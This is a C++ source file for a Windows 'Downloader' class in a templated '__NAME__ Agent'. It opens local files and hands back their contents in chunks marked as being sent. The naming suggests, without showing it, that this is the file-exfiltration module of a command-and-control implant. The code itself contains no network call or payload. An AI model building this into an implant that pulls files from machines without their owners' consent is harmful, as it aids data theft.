// __NAME__ Agent — Downloader Implementation (Stub)
//
#include "Downloader.h"

Downloader::Downloader()
    : downloads(nullptr), downloadCount(0), downloadCapacity(0), nextId(1)
{
    InitializeCriticalSection(&lock);
}

Downloader::~Downloader()
{
    EnterCriticalSection(&lock);
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].hFile && downloads[i].hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(downloads[i].hFile);
            downloads[i].hFile = INVALID_HANDLE_VALUE;
        }
        if (downloads[i].filePath) {
            LocalFree(downloads[i].filePath);
            downloads[i].filePath = nullptr;
        }
    }
    downloadCount = 0;
    LeaveCriticalSection(&lock);

    DeleteCriticalSection(&lock);
    if (downloads) {
        LocalFree(downloads);
        downloads = nullptr;
    }
}

ULONG Downloader::Start(const char* filePath, ULONG chunkSize)
{
    if (!filePath || !*filePath) {
        return 0;
    }

    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart < 0) {
        CloseHandle(hFile);
        return 0;
    }

    SIZE_T pathLen = lstrlenA(filePath);
    char* pathCopy = (char*)LocalAlloc(LPTR, pathLen + 1);
    if (!pathCopy) {
        CloseHandle(hFile);
        return 0;
    }
    CopyMemory(pathCopy, filePath, pathLen);

    EnterCriticalSection(&lock);
    if (downloadCount + 1 > downloadCapacity) {
        int newCapacity = (downloadCapacity > 0) ? downloadCapacity : 4;
        while (newCapacity < downloadCount + 1) {
            newCapacity *= 2;
        }

        SIZE_T bytes = (SIZE_T)newCapacity * sizeof(DownloadState);
        DownloadState* resized = downloads
            ? (DownloadState*)LocalReAlloc(downloads, bytes, LMEM_MOVEABLE | LMEM_ZEROINIT)
            : (DownloadState*)LocalAlloc(LPTR, bytes);
        if (!resized) {
            LeaveCriticalSection(&lock);
            LocalFree(pathCopy);
            CloseHandle(hFile);
            return 0;
        }

        downloads = resized;
        downloadCapacity = newCapacity;
    }

    DownloadState* dl = &downloads[downloadCount++];
    dl->downloadId = nextId++;
    dl->state = DL_STATE_SENDING;
    dl->hFile = hFile;
    dl->filePath = pathCopy;
    dl->chunkSize = chunkSize > 0 ? chunkSize : (100 * 1024);
    dl->totalSize = (ULONG)fileSize.QuadPart;
    dl->bytesSent = 0;

    ULONG id = dl->downloadId;
    LeaveCriticalSection(&lock);
    return id;
}

BYTE* Downloader::ReadChunk(ULONG downloadId, ULONG* outSize)
{
    if (outSize) *outSize = 0;

    EnterCriticalSection(&lock);
    DownloadState* dl = nullptr;
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].downloadId == downloadId) {
            dl = &downloads[i];
            break;
        }
    }

    if (!dl || dl->state != DL_STATE_SENDING || !dl->hFile || dl->hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&lock);
        return nullptr;
    }

    BYTE* buf = (BYTE*)LocalAlloc(LPTR, dl->chunkSize);
    if (!buf) {
        dl->state = DL_STATE_ERROR;
        LeaveCriticalSection(&lock);
        return nullptr;
    }

    DWORD bytesRead = 0;
    BOOL ok = ReadFile(dl->hFile, buf, dl->chunkSize, &bytesRead, nullptr);
    if (!ok) {
        dl->state = DL_STATE_ERROR;
        LocalFree(buf);
        LeaveCriticalSection(&lock);
        return nullptr;
    }

    if (bytesRead == 0) {
        dl->state = DL_STATE_FINISHED;
        CloseHandle(dl->hFile);
        dl->hFile = INVALID_HANDLE_VALUE;
        LocalFree(buf);
        LeaveCriticalSection(&lock);
        return nullptr;
    }

    dl->bytesSent += bytesRead;
    if (dl->bytesSent >= dl->totalSize) {
        dl->state = DL_STATE_FINISHED;
        CloseHandle(dl->hFile);
        dl->hFile = INVALID_HANDLE_VALUE;
    }

    if (outSize) {
        *outSize = bytesRead;
    }
    LeaveCriticalSection(&lock);
    return buf;
}

BOOL Downloader::Finish(ULONG downloadId)
{
    BOOL finished = FALSE;
    EnterCriticalSection(&lock);
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].downloadId != downloadId) {
            continue;
        }
        if (downloads[i].hFile && downloads[i].hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(downloads[i].hFile);
            downloads[i].hFile = INVALID_HANDLE_VALUE;
        }
        downloads[i].state = DL_STATE_FINISHED;
        finished = TRUE;
        break;
    }
    LeaveCriticalSection(&lock);
    return finished;
}

BOOL Downloader::Cancel(ULONG downloadId)
{
    BOOL canceled = FALSE;
    EnterCriticalSection(&lock);
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].downloadId != downloadId) {
            continue;
        }
        if (downloads[i].hFile && downloads[i].hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(downloads[i].hFile);
            downloads[i].hFile = INVALID_HANDLE_VALUE;
        }
        if (downloads[i].filePath) {
            LocalFree(downloads[i].filePath);
            downloads[i].filePath = nullptr;
        }
        if (i != downloadCount - 1) {
            downloads[i] = downloads[downloadCount - 1];
        }
        ZeroMemory(&downloads[downloadCount - 1], sizeof(DownloadState));
        --downloadCount;
        canceled = TRUE;
        break;
    }
    LeaveCriticalSection(&lock);
    return canceled;
}

DownloadState* Downloader::Find(ULONG downloadId)
{
    DownloadState* found = nullptr;
    EnterCriticalSection(&lock);
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].downloadId == downloadId) {
            found = &downloads[i];
            break;
        }
    }
    LeaveCriticalSection(&lock);
    return found;
}

int Downloader::ActiveCount()
{
    int count = 0;
    EnterCriticalSection(&lock);
    for (int i = 0; i < downloadCount; ++i) {
        if (downloads[i].state == DL_STATE_SENDING) {
            ++count;
        }
    }
    LeaveCriticalSection(&lock);
    return count;
}
